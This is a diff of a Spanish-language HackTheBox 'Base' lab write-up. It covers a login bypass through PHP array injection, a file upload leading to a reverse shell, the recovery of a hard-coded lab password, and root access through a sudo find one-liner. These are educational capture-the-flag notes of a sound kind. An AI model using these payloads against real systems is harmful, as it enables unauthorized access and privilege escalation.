@@ -20,11 +20,11 @@ keywords:
 
 - 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+2/Linux/Base)
 - 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=Trejh7Fih34)
-- 🧠 **Explicación resumida**: 
+- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=ZWIzmLDjlTo)
 
 ---
 
-#veryeasy #linux #nmap #ping #arbitraryfileupload #whatweb #arrayinjection #cat #strings #burpsuite #tratamientotty #sudo-l #grep 
+#veryeasy #linux #nmap #ping #arbitraryfileupload #whatweb #arrayinjection #cat #strings #burpsuite #tratamientotty #sudo-l #grep  #abusobinariofind 
 
 -----
 # Guided Mode
@@ -82,17 +82,21 @@ nmap -sCV -p22,80 10.129.95.184 -oN target
 
 ```shell
 whatweb http://10.129.95.184/
-nmap --script http-enum -p80 10.129.95.184 -oN webScan
 ```
-![[Base3.png]]![[Base4.png]]
-Nos informa que es un apache, tambien el dominio base.htb
+![[Base3.png]]
+
+![[Base21.png]]
+
+Nos da el mail info@base.htb, asi que podria existir un dominio base.htb
 
 -------
 # [[Array Injection]]
-Entramos a la parte de login y vemos que esta dentro de un directorio /login
+
+Fui a la parte de login y me redirige a este link
+![[Base22.png]]
 
 ![[Base7.png]]
-Asi que vamos a ese directorio y descargamos el archivo .swp(Explicado en notas que son los .swp)
+Asi que vamos al directorio */login* para ver si encontramos algo y descargamos el archivo .swp que se encuentra en ese directorio
 ![[Base6.png]]
 Ahora si cateamos el archivo nos va a aparecer que es un binario. Lo que vamos a hacer es abrirlo con ``nvim login.php.swp``
 
@@ -104,9 +108,9 @@ Asi que vamos a usar [[strings]] con el comando `strings login.php.swp > loginli
 y ahora lo abrimos con [[cat]] usando el comando `cat loginlimpio.txt -l java` 
 	Aclaracion: Si bien no es java el lenguaje, usa los colores bastante bien para separarlo y entender mejor el codigo
 	
-![[Base11.png]]
+![[Base23.png]]
 
-Despues de analizar el archivo, podemos ver en esta parte que antes de hacer la validacion del usuario y contraseña nos brinda las cookies. Y a la vez por como esta estructurada la comparacion poniendole [] para hacerlo arrays podemos romper la comparativa y ingresar con cualquier usuario y contraseña
+Despues de analizar el archivo, nos muetra que nos da que la sesion es valida con $\_SESSION antes de verificar si el usuario/contraseña es correcto, y que lo primero que hace es redirigir el usuario a upload.php sin importar si las credenciales son correctas o no
 ```
 header("Location: /upload.php");
   72   │             $_SESSION['user_id'] = 1;
@@ -120,17 +124,19 @@ header("Location: /upload.php");
 Interceptamos con burpsuite la peticion
 
 ![[Base12.png]]
-Y cambiamos la ultima linea por `username[]=test&password[]=pass` 
+Y cambiamos la ultima linea por `username[]=test&password[]=pass` para romper la cambiar la peticion de un string a un array para romperla
 Asi ganamos acceso a la pagina upload.php
 ![[Base13.png]]
 
 ----------
 # [[Arbitrary file upload]]
 
-Con el diccionario de seclists no vamos a encontrar nunca el directorio donde se suben los archivos que es http://10.129.95.184/_uploaded/ ya que la palabra uploaded no aparece en los diccionarios. Para poder encontrarla podemos añadir esta palabra, asi ya lo tenemos en un futuro con el comando `echo "_uploaded" | sudo tee -a /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` que va a añadir en la ultima linea la palabra
+Con el diccionario de seclists no vamos a encontrar nunca el directorio donde se suben los archivos que es http://10.129.95.184/_uploaded/ ya que la palabra uploaded no aparece en los diccionarios. Para poder encontrarla vamos a usar [[nvim]] y ponemos `nvim /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` y agregamos en las primeas lineas *\_uploaded*
 
 Vamos a usar [[Gobuster]] para enumerar directorios `gobuster dir -u http://10.129.95.184/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash -t 60`
 ![[Base15.png]]
+
+--------
 ### Sacamos una [[Reverse shell]] 
 Creamos un archivo con nombre rever.php
 ```php
@@ -152,24 +158,31 @@ Y ya estamos adentro de la maquina
 Buscamos con [[grep]]`grep -riE "password|.*password|password.*" ` desde el directorio /var/www/html/login
 Y encontramos la contraseña *thisisagoodpassword*
 ![[Base16.png]]
+Y si vamos al directorio de *home* vemos que existe el usuario *john*
 
+![[Base25.png]]
+Asi que tenemos las credenciales:
+	john:thisisagoodpassword
 ### Conexion por [[ssh]]
 ```shell
 ssh john@10.129.95.184 -p 22
 ```
 ![[Base18.png]]
+Ya tenemos primera flag de intrusion
 
 ------
-# Escalada de privilegios a root con [[Abuso de Sudo]]
+# Escalada de privilegios a root con [[Abuso de Sudo]] del [[Binario find]]
 
 Con `sudo -l` vemos que el binario /usr/bin/find se ejecuta como root
 ![[Base19.png]]
 
-[Articulo de gtfobinds donde se saco esto](https://gtfobins.github.io/gtfobins/find/#suid)
+
+[Articulo de gtfobinds donde se saco este payload](https://gtfobins.github.io/gtfobins/find/#suid)
 ```
 sudo /usr/bin/find . -exec /bin/bash -p \; -quit
 ```
 ![[Base20.png]]
+Ya podemos catear las flags para terminar la maguina
 
 ----------
 # Notas
